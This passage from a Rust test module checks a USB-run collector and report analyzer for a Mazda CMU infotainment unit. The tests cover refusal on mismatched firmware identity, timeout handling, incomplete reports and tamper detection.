    #[cfg(target_os = "linux")]
    fn collector_refuses_wrong_patch_without_creating_report() {
        let usb = TestDirectory::new("patch-refusal-usb");
        let root = TestDirectory::new("patch-refusal-root");
        prepare_payload_files(&usb.0).expect("prepare payload");
        root.write(
            "jci/version.ini",
            b"JCI_SW_VER=\"MAZ_CMU-150_70.00.100\"\n\
JCI_SW_VER_PATCH=\"B\"\n\
JCI_SW_FLAVOR=\"NA\"\n\
JCI_SW_PART_NUMBER=\"SWI10-24818-807R02\"\n",
        );

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(!output.status.success());
        assert!(!usb.0.join("mazda-cmu-report").exists());
        usb.assert_no_firmware_gate_copy();
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn collector_refuses_inexact_identity_metadata_without_creating_report() {
        let target = std::str::from_utf8(TARGET_VERSION_INI).expect("fixture is UTF-8");
        for (label, version_ini) in [
            (
                "wrong-region",
                target.replace("JCI_SW_FLAVOR=\"NA\"", "JCI_SW_FLAVOR=\"EU\""),
            ),
            (
                "wrong-part",
                target.replace("SWI10-24818-807R02", "SWI10-24818-003R02"),
            ),
            (
                "wrong-version-prefix",
                target.replace("MAZ_CMU-150_70.00.100", "NOT_THE_TARGET_70.00.100"),
            ),
            (
                "wrong-flavor-prefix",
                target.replace("JCI_SW_FLAVOR=\"NA\"", "JCI_SW_FLAVOR=\"UNRELATED_NA\""),
            ),
            (
                "embedded-patch",
                target.replace("_70.00.100\"", "_70.00.100A\""),
            ),
            (
                "lowercase-patch",
                target.replace("JCI_SW_VER_PATCH=\"A\"", "JCI_SW_VER_PATCH=\"a\""),
            ),
        ] {
            let usb = TestDirectory::new(label);
            let root = TestDirectory::new(label);
            prepare_payload_files(&usb.0).expect("prepare payload");
            root.write("jci/version.ini", version_ini.as_bytes());

            let output = Command::new("sh")
                .arg(usb.0.join(COLLECTOR_FILE_NAME))
                .env("MAZDA_CMU_INSPECT_TESTING", "1")
                .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
                .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
                .output()
                .expect("run collector");

            assert!(!output.status.success());
            assert!(!usb.0.join("mazda-cmu-report").exists());
            usb.assert_no_firmware_gate_copy();
        }
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn collector_records_timeouts_without_leaving_partial_files() {
        let usb = TestDirectory::new("timeout-usb");
        let root = TestDirectory::new("timeout-root");
        prepare_payload_files(&usb.0).expect("prepare payload");
        root.write("jci/version.ini", TARGET_VERSION_INI);
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .env("MAZDA_CMU_INSPECT_TEST_TIMEOUT_SECONDS", "0.000001")
            .output()
            .expect("run collector");

        assert!(output.status.success());
        let report = usb.0.join("mazda-cmu-report");
        let manifest = fs::read_to_string(report.join("manifest.tsv")).expect("read manifest");
        assert!(manifest.contains("\ttimeout\t0\t-\t-\n"));
        assert!(fs::read_dir(&report)
            .expect("list report")
            .all(|entry| !entry
                .expect("read report entry")
                .file_name()
                .to_string_lossy()
                .starts_with('.')));
        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::ObservationFailed {
                status: "timeout",
                ..
            })
        ));
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn analyzer_refuses_incomplete_report() {
        let usb = TestDirectory::new("incomplete-usb");
        let root = TestDirectory::new("incomplete-root");
        prepare_payload_files(&usb.0).expect("prepare payload");
        root.write("jci/version.ini", TARGET_VERSION_INI);
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");
        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");
        assert!(output.status.success());
        let report = usb.0.join("mazda-cmu-report");
        fs::remove_file(report.join("flush-complete")).expect("remove flush marker");

        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::IncompleteReport)
        ));
    }

    #[test]
    fn posix_checksum_matches_cksum_utility() {
        assert_eq!(posix_cksum(b""), 4_294_967_295);
        assert_eq!(posix_cksum(b"abc"), 1_219_131_554);
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn analyzer_rejects_tampering_duplicate_rows_and_extra_files() {
        let usb = TestDirectory::new("tamper-usb");
        let root = TestDirectory::new("tamper-root");
        prepare_payload_files(&usb.0).expect("prepare payload");
        root.write("jci/version.ini", TARGET_VERSION_INI);
        root.write("proc/sys/kernel/osrelease", b"3.0.35\n");
        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");
        assert!(output.status.success());
        let report = usb.0.join("mazda-cmu-report");
        let original_firmware = fs::read(report.join("firmware-version.ini"))
            .expect("read original firmware observation");
        let original_manifest =
            fs::read_to_string(report.join("manifest.tsv")).expect("read original manifest");
        fs::write(report.join("firmware-version.ini"), b"changed\n")
            .expect("tamper with observation");

        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::ChecksumMismatch("firmware-version.ini"))
        ));

        fs::write(report.join("firmware-version.ini"), original_firmware)
            .expect("restore firmware observation");
        let mut manifest_lines = original_manifest.lines().collect::<Vec<_>>();
        manifest_lines.insert(4, manifest_lines[3]);
        fs::write(
            report.join("manifest.tsv"),
            format!("{}\n", manifest_lines.join("\n")),
        )
        .expect("duplicate manifest row");
        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::InvalidObservation(
                "proc/sys/kernel/osrelease"
            ))
        ));

        fs::write(report.join("manifest.tsv"), original_manifest).expect("restore manifest");
        fs::write(report.join("unexpected.up"), b"unexpected").expect("write extra file");
        assert!(matches!(
            analyze_report(&report),
            Err(AnalyzeError::UnexpectedFile(name)) if name == "unexpected.up"
        ));
    }
}
